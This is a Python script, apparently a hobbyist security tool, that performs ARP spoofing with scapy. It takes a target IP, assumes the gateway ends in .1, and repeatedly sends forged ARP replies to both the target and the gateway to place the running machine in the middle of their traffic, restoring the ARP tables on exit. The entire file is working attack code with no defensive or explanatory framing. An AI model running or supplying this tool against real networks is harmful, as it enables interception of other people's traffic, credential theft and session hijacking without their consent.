import scapy.all as scapy
import subprocess
import argparse
import sys
import time

def get_arguments():
    parser = argparse.ArgumentParser(description='ARP SPOOF')
    parser.add_argument('-t' , '--target' , dest='target', nargs='?' , help='Specify target ip addres
s' , required=True)
    args = parser.parse_args()
    return args




def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)                         
     broadcast   = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')       
     arp_request_broadcast = broadcast/arp_request            
     answered , unanswered = scapy.srp(arp_request_broadcast , timeout=1 , verbose=False)
     if len(answered) == 0:
         print("Invalid IP address")
         sys.exit()

     return answered[0][1].hwsrc


def spoof(target_ip):

    ind = target_ip.find('.' , 8)
    src_ip = target_ip[0:ind] + '.1'
    
    packetone = scapy.ARP(op=2 , pdst=target_ip , hwdst=get_mac(target_ip) , psrc=src_ip)
    scapy.send(packetone , verbose=False)
    
    packettwo = scapy.ARP(op=2 , pdst = src_ip , hwdst=get_mac(src_ip) , psrc = target_ip)
    scapy.send(packettwo , verbose=False)
    

def restore(target_ip):
    ind = target_ip.find('.' , 8)
    src_ip = target_ip[0:ind] + '.1'
    
    packetone = scapy.ARP(op=2 , pdst=target_ip , hwdst=get_mac(target_ip) , psrc=src_ip , hwsrc=get_mac(src_ip))
    scapy.send(packetone , verbose=False)

    packettwo = scapy.ARP(op=2 , pdst=src_ip , hwdst=get_mac(src_ip) , psrc=target_ip , hwsrc=get_mac(target_ip))
    scapy.send(packettwo , verbose=False)


result = get_arguments()
sent_packets = 0



try:

    while True:    
        spoof(result.target)
        sent_packets += 2
        print('\r[+] Packets sent: ' + str(sent_packets) , end='')
        time.sleep(3)
except:
    if sent_packets>0:
        restore(result.target)
    print('\n[-] Quitting')






